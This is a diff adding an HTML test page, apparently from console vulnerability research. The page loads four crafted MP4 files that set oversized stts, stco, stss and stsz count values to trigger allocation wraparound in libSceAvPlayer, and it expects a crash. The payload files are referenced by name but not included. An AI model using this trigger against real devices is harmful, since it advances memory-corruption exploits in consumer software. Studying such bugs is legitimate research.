@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>AvPlayer MP4 count-truncation test</title>
+<style>
+  body { background:#111; color:#eee; font-family:monospace; }
+  button { font-size:16px; margin:6px; padding:10px 16px; cursor:pointer; }
+  #log { margin-top:14px; white-space:pre-wrap; font-size:13px; color:#8f8; }
+</style>
+</head>
+<body>
+<h3>libSceAvPlayer stbl count-truncation test (4 variants)</h3>
+<p>Each button loads the video element with the poisoned mp4. Expected:
+crash / browser restart / blank page. If none of them kills the process,
+the bug is not reached (rejected earlier) — try base.mp4 first to sanity-check playback.</p>
+<button onclick="play('media/evil_stts.mp4')">stts count=0x10000000 (alloc 16n+1 wrap)</button>
+<button onclick="play('media/evil_stco.mp4')">stco count=0x40000000 (alloc 4n = 0)</button>
+<button onclick="play('media/evil_stss.mp4')">stss count=0x40000000 (alloc 4n+1 wrap)</button>
+<button onclick="play('media/evil_stsz.mp4')">stsz count=0x40000000 (alloc 4n+1 wrap)</button>
+<button onclick="play('eviltest/base.mp4')">sanity: base.mp4 (should play)</button>
+<video id="v" width="480" height="270" controls></video>
+<div id="log">ready</div>
+<script>
+function play(src) {
+  var v = document.getElementById('v');
+  var log = document.getElementById('log');
+  log.textContent = 'loading ' + src + ' ...';
+  v.onplaying = function(){ log.textContent = 'PLAYING ' + src + ' (bug not triggered)'; };
+  v.onerror  = function(){ log.textContent = 'error event: ' + v.error.code + ' on ' + src; };
+  v.src = src;
+  v.play();
+}
+</script>
+</body>
+</html>
